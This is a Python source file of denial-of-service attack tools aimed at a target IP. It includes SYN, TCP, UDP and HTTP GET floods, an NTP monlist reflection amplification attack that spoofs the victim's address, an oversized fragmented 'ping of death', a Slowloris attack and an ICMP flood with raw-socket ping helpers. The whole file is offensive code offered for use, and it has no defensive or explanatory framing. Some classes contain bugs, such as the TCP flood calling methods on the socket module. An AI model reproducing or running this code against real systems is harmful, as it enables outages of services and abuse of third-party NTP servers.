import random
import socket
import threading
import os
import struct
import select
import time
from scapy.all import send, fragment, IP, ICMP, Raw, UDP
from progress.bar import Bar



class synFlood():
    def __init__(self, args):
        self.ip = args["ip"]
        self.port = args["port"]
        self.packets = int(args["packets"])
        self.syn = socket.socket()

    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass


class tcpFlood(threading.Thread):
    def __init__(self,  args):
        self.ip = args["ip"]
        self.port = args["port"]
        self.size = int(args["size"])
        self.packets = int(args["packets"])
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes, (self.ip, self.port))
            except:
                pass

class udpFlood():
    def __init__(self,  args):
        self.ip = args["ip"]
        self.port = int(args["port"])
        self.size = int(args["size"])
        self.packets = int(args["packets"])
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes, (self.ip, self.port))
            except:
                pass

class NtpFlood():
    def __init__(self,args):
        self.ip = args["ip"]
        self.threads = args["threads"]
        self.file = open("ntpserver.info")
    def run(self):
        self.currentserver = 0
        self.ntplist = self.file.readlines()

        # Make sure we dont out of bounds
        if self.threads > int(len(self.ntplist)):
            print "More threads than servers"
            self.threads = int(len(self.ntplist))

        # Magic Packet aka NTP v2 Monlist Packet
        self.data = "\x17\x00\x03\x2a" + "\x00" * 4

        # Hold our threads
        threads = []
        print "Starting to flood: " + self.ip +" With " + str(self.threads) + " threads"


        # Thread spawner
        for n in range(self.threads):
            thread = threading.Thread(target=self.deny)
            thread.daemon = True
            thread.start()

            threads.append(thread)

        # In progress!
        print "Sending..."

        # Keep alive so ctrl+c still kills all them threads
        while True:
            time.sleep(1)

    def deny(self):
        # Import globals to function
        self.ntpserver = self.ntplist[self.currentserver]  # Get new server
        self.currentserver = self.currentserver + 1  # Increment for next
        packet = IP(dst=self.ntpserver, src=self.ip) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(
            load=self.data)  # BUILD IT
        send(packet, loop=1)


class deathPing():
    def __init__(self,args):
        self.ip = args["ip"]
        self.length = int(args["length"])
        if self.length < 65536:
            self.length = 65536
    def run(self):
        print "death pinging "+self.ip
        send(fragment(IP(dst=self.ip) / ICMP() / ("V" * self.length)))

class getFlood():
    def __init__(self,args):
        self.ip = args["ip"]
        self.object = args["object"]
        self.packets = int(args["packets"])
        self.http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self):
        self.http.connect((self.ip, 80))
        for i in range(self.packets):
            print ">> GET /" + self.object + " HTTP/1.1"
            self.http.send("GET /" + self.object + " HTTP/1.1\r\n")
            self.http.send("Host: " + self.ip + "\r\n\r\n");
        self.http.close()


class slowLoris():
    def __init__(self,args):
        self.ip = args["ip"]
        self.port = int(args["port"])
        self.sockets = int(args["threads"])
        self.timeout = int(args["timeout"])
        self.regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5"
        ]


    def init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.ip, self.port))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
        for header in self.regular_headers:
            s.send('{}\r\n'.format(header).encode('UTF-8'))
        return s

    def run(self):
        bar = Bar('\033[1;32;40m Creating Sockets...', max=self.sockets)
        socket_list = []
        for _ in range(self.sockets):
            try:
                s = self.init_socket()
            except socket.error:
                break
            socket_list.append(s)
            bar.next()
        bar.finish()
        while True:
            print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
            for s in socket_list:
                try:
                    s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
                except socket.error:
                    socket_list.remove(s)
            for _ in range(self.sockets - len(socket_list)):
                print("\033[1;34;40m {}Re-creating Socket...".format("\n"))
                try:
                    s = self.init_socket()
                    if s:
                        socket_list.append(s)
                except socket.error:
                    break
            time.sleep(self.timeout)

class icmpFlood():
    def __init__(self, args):
        self.ip = args["ip"]
        self.timeout = int(args["timeout"])
        self.packets = int(args["packets"])

    def run(self):
        icmp_ping(self.ip, self.timeout, self.packets)


ICMP_ECHO_REQUEST = 8


def receive_ping(my_socket, ID, timeout):
    """
        receive the ping from the socket
        """
    start_time = timeout
    while True:
        start_select = time.clock()
        # select.select(rlist, wlist, xlist[, timeout])
        # wait until ready for read / write / exceptional condition
        # The return value is a triple of lists
        what_ready = select.select([my_socket], [], [], start_time)
        how_long = (time.clock() - start_select)
        if what_ready[0] == []:  # timeout
            return

        time_received = time.clock()
        # socket.recvfrom(bufsize[, flags])
        # The return value is a pair (string, address)
        rec_packet, addr = my_socket.recvfrom(1024)
        icmp_header = rec_packet[20: 28]
        ip_type, code, checksum, packet_ID, sequence = struct.unpack("bbHHh", icmp_header)
        if ip_type != 8 and packet_ID == ID:  # ip_type should be 0
            byte_in_double = struct.calcsize("d")
            time_sent = struct.unpack("d", rec_packet[28: 28 + byte_in_double])[0]
            return time_received - time_sent

        start_time = start_time - how_long
        if start_time <= 0:
            return


def my_get_checksum(source):
    """
        ~ then add
        """
    checksum = 0
    count = (len(source) / 2) * 2
    i = 0
    while i < count:
        temp = ord(source[i + 1]) * 256 + ord(source[i])  # 256 = 2^8
        checksum = checksum + (~temp & 0xffffffff)
        i = i + 2

    if i < len(source):
        temp = ord(source[len(source) - 1])
        checksum = checksum + (~temp & 0xffffffff)

    # 32-bit to 16-bit
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    return checksum


def send_ping(my_socket, ip_addr, ID):
    """
        send ping to the given ip address
        """
    ip = socket.gethostbyname(ip_addr)

    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    my_checksum = 0

    # Make a dummy heder with a 0 checksum
    # struct.pack(fmt, v1, v2, ...)
    # Return a string containing the values v1, v2, ... packed
    # according to the given format.
    # b:signed char, h:short 2, H:unsigned short 2
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
    # struct.calcsize(fmt)
    # Return the size of the struct corresponding to the given format.
    byte_in_double = struct.calcsize("d")  # C type: double
    data = (192 - byte_in_double) * "P"  # any char is OK, any length is OK
    data = struct.pack("d", time.clock()) + data

    # Calculate the checksum on the data and the dummy header.
    my_checksum = get_checksum(header + data)

    # It's just easier to make up a new header than to stuff it into the dummy.
    # socket.htons(x)
    # Convert 16-bit positive integers from host to network byte order.
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1)
    packet = header + data
    # my_socket.sendto(packet, (ip, 1)) # getsockaddrarg() takes exactly 2 arguments
    my_socket.sendto(packet, (ip, 80))  # it seems that 0~65535 is OK (port?)


def ping_once(ip_addr, timeout):
    """
        return either delay (in second) or none on timeout.
        """
    # Translate an Internet protocol name to a constant suitable for
    # passing as the (optional) third argument to the socket() function.
    icmp = socket.getprotobyname('icmp')
    try:
        # socket.socket([family[, type[, proto]]])
        # Create a new socket using the given address family(default: AF_INET),
        # socket type(SOCK_STREAM) and protocol number(zero or may be omitted).
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error:
        raise

    # Return the current process id.
    # int: 0xFFFF = -1, unsigned int: 65535
    my_ID = os.getpid() & 0xFFFF

    send_ping(my_socket, ip_addr, my_ID)
    delay = receive_ping(my_socket, my_ID, timeout)

    my_socket.close()
    return delay


def icmp_ping(ip_addr, timeout=2, count=4):
    """
        send ping to ip_addr for count times with the given timeout
        """
    for i in range(count):
        print( 'ping ' + ip_addr)
        delay = ping_once(ip_addr, timeout)


        if delay == None:
            print('failed. (timeout within %s second.)' % timeout)
        else:
            print('get reply in %0.4f ms' % (delay * 1000))

def get_checksum(source):
    """
        return the checksum of source
        the sum of 16-bit binary one's complement
        """
    checksum = 0
    count = (len(source) / 2) * 2
    i = 0
    while i < count:
        temp = ord(source[i + 1]) * 256 + ord(source[i])  # 256 = 2^8
        checksum = checksum + temp
        checksum = checksum & 0xffffffff  # 4,294,967,296 (2^32)
        i = i + 2

    if i < len(source):
        checksum = checksum + ord(source[len(source) - 1])
        checksum = checksum & 0xffffffff

    # 32-bit to 16-bit
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    answer = ~checksum
    answer = answer & 0xffff

    # why? ans[9:16 1:8]
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
